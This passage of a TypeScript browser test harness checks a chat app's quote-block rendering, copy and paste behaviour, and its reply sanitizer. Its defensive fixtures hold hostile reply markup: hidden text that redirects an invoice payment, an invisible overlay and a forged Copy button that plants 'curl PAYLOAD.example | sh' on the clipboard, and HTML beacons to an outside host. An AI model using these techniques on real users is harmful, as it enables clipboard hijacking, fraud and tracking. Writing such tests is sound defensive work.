 *  between two lines of text of 1.4 to 3 line heights is one blank line; a
 *  wider one is more than a paragraph break, and is reported as a width. */
const PASTED = `(() => {
  const gaps = function (el) {
    const lh = parseFloat(getComputedStyle(el).lineHeight);
    const tops = [];
    const tw = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, null);
    while (tw.nextNode()) {
      if (!(tw.currentNode.nodeValue || "").trim()) continue;
      const r = document.createRange();
      r.selectNodeContents(tw.currentNode);
      const rects = r.getClientRects();
      for (let i = 0; i < rects.length; i++) tops.push(Math.round(rects[i].top));
    }
    tops.sort(function (a, b) { return a - b; });
    let blank = 0;
    let wide = 0;
    for (let i = 1; i < tops.length; i++) {
      const g = (tops[i] - tops[i - 1]) / lh;
      if (g > 3) wide++;
      else if (g >= 1.4) blank++;
    }
    return { blank: blank, wide: wide };
  };
  const ce = document.getElementById("ce");
  const ua = document.getElementById("ce-ua");
  return { ta: document.getElementById("ta").value, text: ce.innerText, html: ce.innerHTML, zeroed: gaps(ce), ua: gaps(ua) };
})()`;

/* ─── One run: every detector, against one version of the code ─────────────── */

interface Fired { [detector: string]: string[] }

function count(s: string, re: RegExp): number {
  return (s.match(re) || []).length;
}

/** Dirty html: anything a paste target should not receive. */
function dirty(html: string): string[] {
  const why: string[] = [];
  if (/\sclass=/i.test(html)) why.push("class attributes");
  if (/\sstyle=/i.test(html)) why.push("inline styles");
  if (/<blockquote/i.test(html)) why.push("a blockquote");
  if (/(^|<p>|<div>|<br>|\n)\s*&gt;/.test(html)) why.push("a quote marker");
  if (/<button/i.test(html) || />Copy</.test(html)) why.push("the button");
  return why;
}

async function run(
  browser: any,
  origin: string,
  serve: (html: string) => void,
  css: string,
  mut: Mutation
): Promise<Fired> {
  const fired: Fired = {};
  const hit = (d: string, why: string) => { (fired[d] = fired[d] || []).push(why); };

  const md: any = mut.md ? await loadMutated(MD_FILE, mut.md) : realMd;
  const email: any = mut.email ? await loadMutated(EMAIL_FILE, mut.email) : realEmail;
  const bundle = pageBundle(mut);
  const sheet = mut.css ? mut.css(css) : css;
  if (mut.css && sheet === css) throw new Error("CSS mutation changed nothing — re-anchor it");

  for (let f = 0; f < FIXTURES.length; f++) {
    const fx = FIXTURES[f];
    const parsed = md.parseSourcesFromContent(fx.md);
    const formatted = md.formatMarkdown(parsed.cleanContent, parsed.sources);
    const combos = fx.quotes > 0 ? COMBOS : COMBOS.slice(0, 1);
    for (let c = 0; c < combos.length; c++) {
      const combo = combos[c];
      const where = `${fx.key} @${combo.width} ${combo.theme}`;
      serve(harness(sheet, bundle, formatted, combo.theme));
      const page = await browser.newPage();
      await page.setViewport({ width: combo.width, height: 900 });
      await page.goto(origin, { waitUntil: "load" });
      const m: any = await page.evaluate(MEASURE);

      if (m.markerLines.length > 0) hit("marker", `${where}: "${m.markerLines[0].slice(0, 50)}"`);
      if (m.quotes !== fx.quotes || m.nested !== fx.nested || m.buttons !== fx.quotes) {
        hit("structure", `${where}: ${m.quotes} quotes, ${m.nested} nested, ${m.buttons} buttons — want ${fx.quotes}, ${fx.nested}, ${fx.quotes}`);
      }
      if (fx.mustShow) {
        for (let i = 0; i < fx.mustShow.length; i++) {
          if (m.shown.indexOf(fx.mustShow[i]) < 0) hit("notaquote", `${where}: "${fx.mustShow[i].slice(0, 40)}" is not on screen as written`);
        }
        if (m.quotes > 0) hit("notaquote", `${where}: a mid-line ">" became a quote`);
      }
      if (fx.codeKeeps) {
        const allCode = m.code.join("\n");
        for (let i = 0; i < fx.codeKeeps.length; i++) {
          if (allCode.indexOf(fx.codeKeeps[i]) < 0) hit("code", `${where}: "${fx.codeKeeps[i].slice(0, 30)}" did not survive inside the code`);
        }
      }
      for (let q = 0; q < m.styles.length; q++) {
        const s = m.styles[q];
        if (s.fontStyle !== "normal" || (s.topColor !== null && s.color !== s.topColor) ||
            (s.topFontSize !== null && s.fontSize !== s.topFontSize) ||
            (s.topFontWeight !== null && s.fontWeight !== s.topFontWeight)) {
          hit("style", `${where} #${q}: ${s.fontStyle} ${s.fontSize} ${s.fontWeight} ${s.color} against the reply's ${s.topFontSize} ${s.topFontWeight} ${s.topColor}`);
        }
        if (s.contrast < 4.5) hit("contrast", `${where} #${q}: ${s.contrast.toFixed(2)}:1`);
        if (!s.framed) hit("frame", `${where} #${q}: nothing marks the block out`);
        if (!s.buttonInside || s.overlaps > 0) hit("overlap", `${where} #${q}: button ${s.buttonInside ? "inside" : "OUTSIDE"} the frame, over ${s.overlaps} text rects`);
        if (s.over > 0) hit("overflow", `${where} #${q}: the block is ${s.over}px wider than its frame`);
      }
      if (m.docOver > 0) hit("overflow", `${where}: the page scrolls sideways by ${m.docOver}px`);

      if (c === 0) {
        // The copy, once per block. The clipboard is primed with a sentinel,
        // so "nothing happened" cannot read as "the right thing happened".
        await page.bringToFront();
        for (let k = 0; k < fx.blocks.length; k++) {
          const want = fx.blocks[k];
          await page.evaluate(`navigator.clipboard.writeText(${JSON.stringify(SENTINEL)})`);
          const btns = await page.$$("#ai [data-quote-copy]");
          if (!btns[k]) { hit("copy", `${fx.key} #${k}: there is no button to click`); continue; }
          await btns[k].click();
          await page.waitForFunction(
            `(document.querySelectorAll("#ai [data-quote-copy]")[${k}] || {}).textContent !== "Copy"`,
            { timeout: 3000 }
          ).catch(() => undefined);
          const label: string = await page.evaluate(`(document.querySelectorAll("#ai [data-quote-copy]")[${k}] || {}).textContent || ""`);
          const clip: any = await page.evaluate(CLIP);
          if (clip.plain === SENTINEL || label === "Copy") { hit("copy", `${fx.key} #${k}: clicking the button copied nothing`); continue; }
          if (label !== "Copied") hit("fallback", `${fx.key} #${k}: the button says "${label}"`);
          // The numbers: as the block shows them, as the html half numbers
          // them, and as the plain half writes them — one sequence, three times.
          const shownOrd: number[] = await page.evaluate(`(${ORDINALS})(document.querySelectorAll("#ai .ai-quote-wrap > blockquote.ai-quote")[${k}])`);
          const htmlOrd: number[] = clip.html === null ? [] :
            await page.evaluate(`(${ORDINALS})(new DOMParser().parseFromString(${JSON.stringify(clip.html)}, "text/html").body)`);
          const plainOrd: number[] = [];
          const plainLines = String(clip.plain || "").split("\n");
          for (let li = 0; li < plainLines.length; li++) {
            const om = /^\s*(\d+)\.\s/.exec(plainLines[li]);
            if (om) plainOrd.push(parseInt(om[1], 10));
          }
          // No html half at all is copyhtml's to report.
          if ((clip.html !== null && htmlOrd.join(",") !== shownOrd.join(",")) || plainOrd.join(",") !== shownOrd.join(",")) {
            hit("ordinals", `${fx.key} #${k}: shown ${shownOrd.join(",") || "none"}, html ${htmlOrd.join(",") || "none"}, plain ${plainOrd.join(",") || "none"}`);
          }
          if (clip.plain !== want.plain) hit("copytext", `${fx.key} #${k}: text/plain was ${JSON.stringify((clip.plain || "").slice(0, 90))}`);
          if (clip.html === null) hit("copyhtml", `${fx.key} #${k}: no text/html on the clipboard`);
          else {
            const d = dirty(clip.html);
            if (d.length) hit("copyhtml", `${fx.key} #${k}: text/html carries ${d.join(", ")}`);
            // A paragraph is a <p> or a <div> with something in it; a <br>
            // that IS a blank line is not a line break inside one.
            const blanks = count(clip.html, /<(p|div)><br><\/(p|div)>/g);
            const paras = count(clip.html, /<p>/g) + count(clip.html, /<div>/g) - blanks;
            const brs = count(clip.html, /<br>/g) - blanks;
            if (paras !== want.paras || brs !== want.brs) hit("copyhtml", `${fx.key} #${k}: ${paras} <p> and ${brs} <br>, want ${want.paras} and ${want.brs}`);
          }
          // And pasted, by Chrome's own paste command, into both kinds of field.
          await page.evaluate(`(() => { document.getElementById("ta").value = ""; document.getElementById("ce").innerHTML = ""; document.getElementById("ce-ua").innerHTML = ""; })()`);
          await page.focus("#ta");
          await page.keyboard.press("KeyV", { commands: ["Paste"] });
          await page.focus("#ce");
          await page.keyboard.press("KeyV", { commands: ["Paste"] });
          await page.focus("#ce-ua");
          await page.keyboard.press("KeyV", { commands: ["Paste"] });
          const pasted: any = await page.evaluate(PASTED);
          if (pasted.ta !== clip.plain) hit("paste", `${fx.key} #${k}: the textarea got ${JSON.stringify(pasted.ta.slice(0, 60))}`);
          const wantPasted = want.pasted !== undefined ? want.pasted : want.plain;
          // innerText writes a blank <div> as two newlines on top of the block
          // break; what the reader sees is one blank line either way, and the
          // spacing detector below measures that on screen.
          const read = pasted.text.replace(/\n{3,}/g, "\n\n");
          if (read !== wantPasted) hit("paste", `${fx.key} #${k}: the rich field reads ${JSON.stringify(read.slice(0, 90))}`);
          const pd = dirty(pasted.html);
          if (pd.length) hit("paste", `${fx.key} #${k}: the rich field was given ${pd.join(", ")}`);
          // The blank lines a reader SEES after the paste, in both regimes.
          // They must match the blank lines in the plain text — none missing
          // (bare <p>s under zeroed margins) and none doubled (an empty <p>
          // under the browser's own margins).
          const wantBlanks = want.plain.split("\n\n").length - 1;
          const z = pasted.zeroed;
          const u = pasted.ua;
          if (z.blank !== wantBlanks || u.blank !== wantBlanks || z.wide > 0 || u.wide > 0) {
            hit("spacing", `${fx.key} #${k}: ${z.blank} blank lines (${z.wide} wider) with margins zeroed, ${u.blank} (${u.wide} wider) with the browser's own — want ${wantBlanks}`);
          }
        }
        // The code block's own button goes through the same handler now.
        if (fx.key === "code") {
          await page.evaluate(`navigator.clipboard.writeText(${JSON.stringify(SENTINEL)})`);
          const cb = await page.$("#ai [data-code-copy]");
          if (!cb) hit("codecopy", "the code block has no Copy button");
          else {
            await cb.click();
            await page.waitForFunction(`document.querySelector("#ai [data-code-copy]").textContent !== "Copy"`, { timeout: 3000 }).catch(() => undefined);
            const clip: any = await page.evaluate(CLIP);
            if (clip.plain !== "> quoted inside a code block\n> stays exactly as written") {
              hit("codecopy", `the code block copied ${JSON.stringify(String(clip.plain).slice(0, 60))}`);
            }
          }
        }
      }
      await page.close();
    }

    // The message's own Copy: everything, commentary included, no markers —
    // except inside code, where a ">" is code.
    const whole: string = md.plainTextForCopy(fx.md);
    const outsideCode = whole.replace(/```[\s\S]*?```/g, "");
    const stray = outsideCode.split("\n").filter((l: string) => /^\s*>/.test(l));
    if (stray.length) hit("msgcopy", `${fx.key}: the message Copy keeps "${stray[0].slice(0, 40)}"`);
    if (fx.msgCopy !== undefined && whole !== fx.msgCopy) hit("msgcopy", `${fx.key}: the message Copy gave ${JSON.stringify(whole.slice(0, 90))}`);
    if (fx.codeKeeps) {
      for (let i = 0; i < fx.codeKeeps.length; i++) {
        if (whole.indexOf(fx.codeKeeps[i]) < 0) hit("msgcopy", `${fx.key}: the message Copy stripped a ">" inside code`);
      }
    }
  }

  // A reply the renderer cannot survive is a message that does not render at
  // all. Quotes recurse, so the floor is asserted, not assumed.
  try {
    md.formatMarkdown("> ".repeat(3000) + "too deep");
  } catch (e: any) {
    hit("depth", `3,000 nested quote markers: ${e && e.message ? e.message : e}`);
  }

  await hostile(browser, origin, serve, sheet, bundle, md, hit);

  // The scheduled email renders the same reply without the stylesheet.
  const mail: string = email.markdownToEmailHtml(fixtureNamed("incident").md).html;
  if (!/<blockquote/.test(mail) || /(<p[^>]*>|<br\/?>)\s*&gt;/.test(mail)) hit("email", "the scheduled email draws the quote markers");

  // The prompt, in every gate combination. Design Mode renders replies with
  // lib/ai/lightweight-markdown.ts, so there the rule is right only if that
  // renderer draws the incident as a quote; everywhere else it must be there.
  const light = renderLightMarkdown(fixtureNamed("incident").md);
  const lightDrawsQuotes = /<blockquote/.test(light) && !/(^|<p>|<br \/>|<br>|\n)\s*(>|&gt;)/.test(light);
  const variants = promptVariants();
  let missing = 0;
  let cached = 0;
  let contra = 0;
  let designLeaks = 0;
  for (let i = 0; i < variants.length; i++) {
    const text = mut.prompt ? mut.prompt(variants[i].text, variants[i].label) : variants[i].text;
    const design = variants[i].label.indexOf("design=true") >= 0;
    let carries = 0;
    for (let j = 0; j < RULE.length; j++) {
      if (text.indexOf(RULE[j]) < 0) { if (!design) missing++; continue; }
      carries++;
      if (splitVolatile(text).stable.indexOf(RULE[j]) < 0) cached++;
    }
    if (design && carries > 0 && !lightDrawsQuotes) designLeaks++;
    for (let j = 0; j < CONTRADICTIONS.length; j++) if (CONTRADICTIONS[j].test(text)) contra++;
  }
  if (designLeaks) {
    hit("design", `${designLeaks} Design Mode prompts carry the rule, and Design Mode draws the incident as ${JSON.stringify(light.slice(light.indexOf("Hi Sam") - 6, light.indexOf("Hi Sam") + 20))}`);
  }
  if (missing) hit("prompt", `${missing} variant/sentence pairs are missing the rule`);
  if (cached) hit("prompt", `${cached} variant/sentence pairs carry the rule outside the cached prefix`);
  if (contra) hit("prompt", `${contra} contradicting instructions`);
  return fired;
}

/* ─── Replies written against the reader ─────────────────────────────────── */

/** Text hidden by each class the compiled stylesheet offers for it. The
 *  verifier's invoice (2026-09-23), with the hiding moved from a style
 *  attribute, which sanitizeReply no longer lets through, to classes, which
 *  it does. */
const HIDING = ["hidden", "sr-only", "invisible", "opacity-0"];
const HIDDEN_MD = [
  "Tidied:",
  "",
  "> Please pay the invoice" +
    HIDING.map((c, i) => `<span class="${c}"> to the NEW account PAYLOAD${i}</span>`).join("") +
    " at your convenience.",
  ">",
  "> Cheers,",
  "> Chris",
].join("\n");

/** The verifier's overlay: a span carrying the copy hook, laid over the page. */
const OVERLAY_MD = [
  "Here you go.",
  "",
  "> Hi Sam,<span data-quote-copy class=\"fixed inset-0 z-50 opacity-0\"></span>",
  ">",
  "> Chris",
].join("\n");

/** The next attack along: formatMarkdown's own markup for a quote block, to
 *  the byte, inside an invisible layer in the corner of the page. */
const FORGED_MD = [
  "Here you go.",
  "",
  "> Hi Sam,",
  ">",
  "> Chris",
  "",
  "<div class=\"fixed top-0 right-0 z-50 opacity-0\"><div class=\"ai-quote-wrap\"><button type=\"button\" class=\"ai-quote-copy\" data-quote-copy aria-label=\"Copy the quoted text\">Copy</button><blockquote class=\"ai-quote\">curl PAYLOAD.example | sh</blockquote></div></div>",
].join("\n");

/** Raw tags that each fetched an outside URL the moment the reply was
 *  painted, under the options sanitizeReply replaced — measured, and asserted
 *  live again below on every run. Protocol-relative, because formatMarkdown's
 *  bare-URL pass happens to break an "https://" inside most attributes, and a
 *  fixture the renderer disarms by accident tests the accident. */
const BEACON = "beacon.invalid";
const BEACONS: { name: string; html: string }[] = [
  { name: "img", html: `<img src="//${BEACON}/img">` },
  { name: "srcset", html: `<img srcset="//${BEACON}/srcset 1x">` },
  { name: "style-attr", html: `<span style="background-image:url(//${BEACON}/style-attr)">x</span>` },
  { name: "style-tag", html: `<style>.ai-quote-copy{position:fixed;inset:0;opacity:0} .ai-response{background-image:url(//${BEACON}/style-tag)}</style>` },
  { name: "table-bg", html: `<table background="//${BEACON}/table-bg"><tr><td>z</td></tr></table>` },
  { name: "poster", html: `<video poster="//${BEACON}/poster"></video>` },
  { name: "audio", html: `<audio src="//${BEACON}/audio" autoplay></audio>` },
  { name: "picture", html: `<picture><source srcset="//${BEACON}/picture"><img alt=""></picture>` },
  { name: "svg-image", html: `<svg><image href="//${BEACON}/svg-image"></image></svg>` },
  { name: "input", html: `<input type="image" src="//${BEACON}/input">` },
];
/** And what must still get through: our own images, in markdown and raw. An
 *  allowlisted src with an outside retry URL fetches nothing at paint — it
 *  fires on the first load error — so it is judged on the markup. */
const BEACON_MD = [
  "Here you go.",
  "",
  "> Hi Sam,",
  ">",
  "> Chris",
  "",
  "![chart](/api/media/file?path=chart.png)",
  "",
  "<img src=\"/api/media/file?path=raw.png\" alt=\"\">",
  "",
  `<img src="/api/media/file?path=retry.png" data-retry-src="//${BEACON}/retry">`,
  "",
  "<span data-evil=\"1\" hidden>and a data attribute the page did not write</span>",
].concat(BEACONS.map((b) => `\n${b.html}`)).join("\n");

/** The options sanitizeReply replaced, kept here as the reference the
 *  hostile fixtures are shown to be live against. */
const OLD_OPTIONS = `{ ADD_ATTR: ["target", "rel", "data-source-num", "loading", "data-retry-src", "data-code-copy", "data-quote-copy"] }`;

/** Load a reply into a page that records every request for the beacon host. */
async function hostilePage(browser: any, origin: string, serve: (html: string) => void, html: string, fetched: string[], local: string[]): Promise<any> {
  serve(html);
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 900 });
  await page.setRequestInterception(true);
  page.on("request", (r: any) => {
    const u: string = r.url();
    if (u.indexOf(BEACON) >= 0) { fetched.push(u.slice(u.indexOf(BEACON) + BEACON.length + 1)); r.abort().catch(() => undefined); return; }
    if (u.indexOf("/api/media/") >= 0) local.push(u.slice(u.indexOf("/api/media/")));
    r.continue().catch(() => undefined);
  });
  await page.goto(origin, { waitUntil: "load" });
  await new Promise((r) => setTimeout(r, 300));
  return page;
}

/** The same page, sanitised with the replaced options instead. */
function withOldOptions(html: string): string {
  const call = "ChatMd.sanitizeReply(DOMPurify, ";
  const at = html.indexOf(call);
  if (at < 0) throw new Error("the harness no longer calls sanitizeReply — re-anchor withOldOptions");
  const end = html.indexOf(");", at);
  return html.slice(0, at) + "DOMPurify.sanitize(" + html.slice(at + call.length, end) + ", " + OLD_OPTIONS + html.slice(end);
}

/** Every attack, run against one version of the code. */
async function hostile(
  browser: any,
  origin: string,
  serve: (html: string) => void,
  sheet: string,
  bundle: string,
  md: any,
  hit: (d: string, why: string) => void
): Promise<void> {
  const page_ = (text: string) => {
    const parsed = md.parseSourcesFromContent(text);
    return harness(sheet, bundle, md.formatMarkdown(parsed.cleanContent, parsed.sources), "light");
  };
  const clip = async (page: any) => ((await page.evaluate(CLIP)) as any);
  const prime = (page: any) => page.evaluate(`navigator.clipboard.writeText(${JSON.stringify(SENTINEL)})`);
  /** Every button's label that is not "Copy" — a hijacked click relabels one. */
  const labels = (page: any) => page.evaluate(`Array.prototype.filter.call(document.querySelectorAll("#ai button"), function (b) { return b.textContent !== "Copy"; }).map(function (b) { return b.textContent; }).join("|")`);

  // Hidden text. The spans must be in the page — or this proves nothing —
  // and none of their words may reach the clipboard.
  {
    const page = await hostilePage(browser, origin, serve, page_(HIDDEN_MD), [], []);
    const present: number = await page.evaluate(`document.querySelectorAll(${JSON.stringify(HIDING.map((c) => "#ai span." + c).join(", "))}).length`);
    if (present !== HIDING.length) hit("live", `hidden: ${present} of ${HIDING.length} hiding spans reached the page`);
    await page.bringToFront();
    await prime(page);
    const btn = await page.$("#ai .ai-quote-wrap > button.ai-quote-copy");
    if (btn) await btn.click();
    await new Promise((r) => setTimeout(r, 300));
    const c = await clip(page);
    await page.evaluate(`(() => { document.getElementById("ta").value = ""; })()`);
    await page.focus("#ta");
    await page.keyboard.press("KeyV", { commands: ["Paste"] });
    const pasted: string = await page.evaluate(`document.getElementById("ta").value`);
    const all = `${c.plain}\n${c.html}\n${pasted}`;
    // Hidden words must not come; the visible ones must — a copy of nothing
    // hides everything. The exact text is copytext's, on the plain fixtures.
    if (c.plain === SENTINEL) hit("copy", "hidden: the real button copied nothing");
    else if (all.indexOf("PAYLOAD") >= 0 || c.plain.indexOf("Please pay the invoice") < 0 || c.plain.indexOf(" at your convenience.") < 0) {
      hit("unseen", `hidden: copied ${JSON.stringify(String(c.plain).slice(0, 120))}`);
    }
    await page.close();
  }

  // The overlay: a click on empty page lands on it. It must copy nothing and
  // change no button's label; the real button, clicked, still copies.
  {
    const page = await hostilePage(browser, origin, serve, page_(OVERLAY_MD), [], []);
    await page.bringToFront();
    const under: string = await page.evaluate(`(function () { var e = document.elementFromPoint(8, 890); return e ? e.tagName + "." + e.className + (e.hasAttribute("data-quote-copy") ? "[hook]" : "") : "none"; })()`);
    if (under.indexOf("SPAN.fixed") !== 0 || under.indexOf("[hook]") < 0) hit("live", `overlay: a click on empty page lands on ${under}, not the overlay`);
    await prime(page);
    await page.mouse.click(8, 890);
    await new Promise((r) => setTimeout(r, 300));
    const c = await clip(page);
    const l: string = await labels(page);
    if (c.plain !== SENTINEL || l !== "") hit("hijack", `overlay: a click on empty page wrote ${JSON.stringify(String(c.plain).slice(0, 60))}${l ? ` and a button now reads ${l}` : ""}`);
    await prime(page);
    await page.evaluate(`(function () { var b = document.querySelector("#ai .ai-quote-wrap > button.ai-quote-copy"); if (b) b.click(); })()`);
    await new Promise((r) => setTimeout(r, 300));
    const real = await clip(page);
    if (real.plain === SENTINEL) hit("copy", "overlay: the real button, clicked, copied nothing");
    await page.close();
  }

  // The forged button: formatMarkdown's markup, in an invisible layer.
  {
    const page = await hostilePage(browser, origin, serve, page_(FORGED_MD), [], []);
    await page.bringToFront();
    const at: any = await page.evaluate(`(function () {
      var b = document.querySelector("#ai .fixed .ai-quote-copy");
      if (!b) return null;
      var r = b.getBoundingClientRect();
      var x = r.left + r.width / 2, y = r.top + r.height / 2;
      return { x: x, y: y, hit: document.elementFromPoint(x, y) === b };
    })()`);
    if (!at || !at.hit) hit("live", "forged: the forged button is not what a click at its place lands on");
    else {
      await prime(page);
      await page.mouse.click(at.x, at.y);
      await new Promise((r) => setTimeout(r, 300));
      const c = await clip(page);
      if (c.plain !== SENTINEL) hit("hijack", `forged: a click on an invisible button wrote ${JSON.stringify(String(c.plain).slice(0, 60))}`);
    }
    await page.close();
  }

  // What a hostile reply fetches, styles and keeps.
  {
    const fetched: string[] = [];
    const local: string[] = [];
    const page = await hostilePage(browser, origin, serve, page_(BEACON_MD), fetched, local);
    if (fetched.length) hit("beacon", `painting the reply fetched ${fetched.join(", ")}`);
    const btn: any = await page.evaluate(`(function () { var b = document.querySelector("#ai .ai-quote-wrap > button.ai-quote-copy"); if (!b) return null; var cs = getComputedStyle(b); return { position: cs.position, opacity: cs.opacity }; })()`);
    // No button at all is the structure detector's to report, not this one's.
    if (btn && (btn.position !== "static" || btn.opacity !== "1")) hit("restyle", `the Copy button is ${btn.position}, opacity ${btn.opacity}`);
    const kept: string = await page.evaluate(`document.getElementById("ai").innerHTML`);
    const bad = /beacon\.invalid|data-evil|\sstyle=|\shidden|<style/i.exec(kept);
    if (bad) hit("vocab", `the sanitised reply kept "${bad[0]}"`);
    if (local.indexOf("/api/media/file?path=chart.png") < 0 || local.indexOf("/api/media/file?path=raw.png") < 0) {
      hit("vocab", `our own images did not load: ${local.join(", ") || "none"}`);
    }
    await page.close();
  }
}

/** The hostile fixtures are LIVE: under the options sanitizeReply replaced,
 *  every beacon fetches, the <style> moves the button, and the attributes
 *  the vocabulary assertion looks for are kept. Run once, unmutated — an
 *  attack that never reached the page would make every red above a pass. */
async function hostileIsLive(browser: any, origin: string, serve: (html: string) => void, sheet: string): Promise<string[]> {
  const parsed = realMd.parseSourcesFromContent(BEACON_MD);
  const html = withOldOptions(harness(sheet, pageBundle(NONE), realMd.formatMarkdown(parsed.cleanContent, parsed.sources), "light"));
  const fetched: string[] = [];
  const page = await hostilePage(browser, origin, serve, html, fetched, []);
  const btn: any = await page.evaluate(`(function () { var b = document.querySelector("#ai .ai-quote-wrap > button.ai-quote-copy"); return b ? getComputedStyle(b).position : "gone"; })()`);
  const kept: string = await page.evaluate(`document.getElementById("ai").innerHTML`);
  await page.close();
  const dead: string[] = [];
  for (let i = 0; i < BEACONS.length; i++) if (fetched.indexOf(BEACONS[i].name) < 0) dead.push(BEACONS[i].name);
  if (btn !== "fixed") dead.push(`style-tag restyle (${btn})`);
  if (kept.indexOf(`data-retry-src="//${BEACON}/retry"`) < 0) dead.push("retry URL");
  if (kept.indexOf("data-evil") < 0) dead.push("data-evil");
  return dead;
}

/* ─── The prompt ──────────────────────────────────────────────────────────── */

/** Two load-bearing pieces, not the whole block: pinning all of it would go
 *  red on every honest edit. */
const RULE = [
  "SEND-READY TEXT (an email, message, post, reply, bio — anything the user will paste somewhere):",
  "Put it alone in a `>` quote block, one block per version, commentary outside.",
];
/** Anything that would tell a model to put a draft somewhere else, or to keep
 *  quote blocks out of chat. The document rule's "`> ` blockquote callout" is
 *  about a Word body and is not matched. */
const CONTRADICTIONS = [
  /(draft|email|message|post|reply)[^.\n]{0,60}\b(in|inside|into) (a )?(code block|code fence|fenced block|```)/i,
  /(never|don't|do not) (use|write) (a )?(quote block|blockquote|`>`)/i,
];

let variantCache: { label: string; text: string }[] | null = null;
function promptVariants(): { label: string; text: string }[] {
  if (variantCache) return variantCache;
  const base: any = {
    conversationVisibility: "private",
    userName: "Test",
    workspaceConfig: { companyContext: "TCE is a content agency.", contentTypes: [], cuDefinitions: [], formatDescriptions: {}, typeInstructions: {} },
    clientContext: null,
    contentDetail: null,
  };
  const out: { label: string; text: string }[] = [];
  const FLAGS = [false, true];
  for (let a = 0; a < FLAGS.length; a++) {
    for (let b = 0; b < FLAGS.length; b++) {
      for (let c = 0; c < FLAGS.length; c++) {
        for (let d = 0; d < FLAGS.length; d++) {
          out.push({
            label: `generation=${FLAGS[a]} design=${FLAGS[b]} studio=${FLAGS[c]} resourcing=${FLAGS[d]}`,
            text: buildSystemPrompt({ ...base, generationTools: FLAGS[a], designMode: FLAGS[b], studioMode: FLAGS[c], resourcingAccess: FLAGS[d] }),
          });
        }
      }
    }
  }
  out.push({ label: "role persona", text: buildSystemPrompt({ ...base, role: { name: "Editor", instructions: "You edit." } }) });
  out.push({ label: "team thread", text: buildSystemPrompt({ ...base, conversationVisibility: "team" }) });
  variantCache = out;
  return out;
}

/* ─── Main ────────────────────────────────────────────────────────────────── */

const DETECTORS: { key: string; says: string }[] = [
  { key: "marker", says: "no line on screen starts with \">\" outside code" },
  { key: "structure", says: "every fixture draws the quotes, nesting and buttons it should" },
  { key: "notaquote", says: "a \">\" in the middle of a line stays a sentence" },
  { key: "code", says: "a \">\" inside a code block or content card is untouched" },
  { key: "style", says: "a draft is set in the reply's own type: upright, same size, weight and colour" },
  { key: "contrast", says: "the draft reads at 4.5:1 or better on its frame" },
  { key: "frame", says: "the block is visibly its own block" },
  { key: "overlap", says: "the Copy button sits inside the frame and over no text" },
  { key: "overflow", says: "nothing scrolls sideways, at 1280 or 375" },
  { key: "copy", says: "clicking the block's button copies something" },
  { key: "fallback", says: "the rich copy is the one that ran" },
  { key: "copytext", says: "text/plain is the draft exactly — paragraphs, line breaks, links written out" },
  { key: "copyhtml", says: "text/html is bare lines and <br> — no class, style, quote bar, marker or button" },
  { key: "paste", says: "pasted by Chrome into a textarea and a rich field, it is the draft and nothing else" },
  { key: "spacing", says: "pasted into a rich field, it shows one blank line per paragraph break — with margins zeroed and without" },
  { key: "ordinals", says: "a numbered list copies with the numbers it shows, in both halves" },
  { key: "codecopy", says: "the code block's Copy still copies the code" },
  { key: "msgcopy", says: "the message Copy strips quote markers, and only outside code" },
  { key: "depth", says: "a line of 3,000 nested quote markers renders instead of taking the renderer off the stack" },
  { key: "email", says: "the scheduled email draws a quote, not its markers" },
  { key: "prompt", says: "every assembled prompt outside Design Mode carries the rule, in the cached prefix, uncontradicted" },
  { key: "design", says: "the rule reaches a Design Mode prompt only if Design Mode's renderer draws the incident as a quote" },
  { key: "live", says: "every hostile reply reaches the page: the hidden spans, the overlay and the forged button are there" },
  { key: "unseen", says: "text hidden by a class never reaches the clipboard" },
  { key: "hijack", says: "a click that is not on the real Copy button writes nothing, and relabels nothing" },
  { key: "beacon", says: "painting a hostile reply fetches nothing from an outside host" },
  { key: "restyle", says: "a <style> in a reply cannot restyle the page's Copy button" },
  { key: "vocab", says: "the sanitised reply keeps the renderer's vocabulary only — and our own images still load" },
];

async function main() {
  const selfTest = process.argv.indexOf("--self-test") >= 0;
  const exe = process.env.CHROME_EXECUTABLE_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
  if (!existsSync(exe)) {
    console.log(`\n✗ cannot run: no Chrome at ${exe}. Set CHROME_EXECUTABLE_PATH.\n`);
    process.exit(1);
  }

  console.log("\n1. The code under test is the code MessageBubble runs");
  assert(sanitizeCall[0] === "sanitizeReply" && sanitizeImport[0] === "sanitizeReply",
    "MessageBubble's reply HTML is sanitizeReply(DOMPurify, formatMarkdown(…)) from @/lib/ai/chat-markdown, which the page runs");
  assert(clickCall[0] === "handleResponseClick" && clickImport[0] === "handleResponseClick",
    "the reply's onClick is handleResponseClick(e.target) from @/lib/ai/chat-copy, and nothing else");
  assert(msgCopyCall[0] === "plainTextForCopy", "the message-level Copy writes plainTextForCopy(content)");
  const copyImports = importsOf(COPY_FILE);
  assert(copyImports.length === 1 && copyImports[0] === "@/lib/optimizer/export",
    `chat-copy.ts imports only what the harness loads (${copyImports.join(", ") || "nothing"})`);
  assert(importsOf(MD_FILE).length === 0 && importsOf(EMAIL_FILE).length === 0 && importsOf(EXPORT_FILE).length === 0,
    "chat-markdown.ts, email-html.ts and export.ts import nothing, so a mutated copy loads on its own");
  const css = compileCss();
  assert(css.length > 50000 && css.indexOf(".ai-quote-wrap") >= 0,
    `app/globals.css compiled through the project's Tailwind (${Math.round(css.length / 1024)}KB), quote rules included`);
  const uncompiled = HIDING.concat(["fixed", "inset-0", "top-0", "right-0", "z-50"]).filter((c) => css.indexOf(`.${c} {`) < 0 && css.indexOf(`.${c}{`) < 0);
  assert(uncompiled.length === 0,
    `the classes the hostile replies use are in the compiled stylesheet${uncompiled.length ? ` — missing: ${uncompiled.join(", ")}` : ""}, so the attacks are real`);
  const variants = promptVariants();
  assert(variants.length === 18 && variants[0].text.length > 4000, `${variants.length} prompt variants assembled, shortest a real prompt`);

  let current = "";
  const server = createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    res.end(current);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const serve = (html: string) => { current = html; };

  const puppeteer = (await import("puppeteer-core")).default as any;
  const browser = await puppeteer.launch({
    executablePath: exe,
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--font-render-hinting=none"],
    headless: true,
  });
  try {
    await browser.defaultBrowserContext().overridePermissions(origin, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);

    const dead = await hostileIsLive(browser, origin, serve, css);
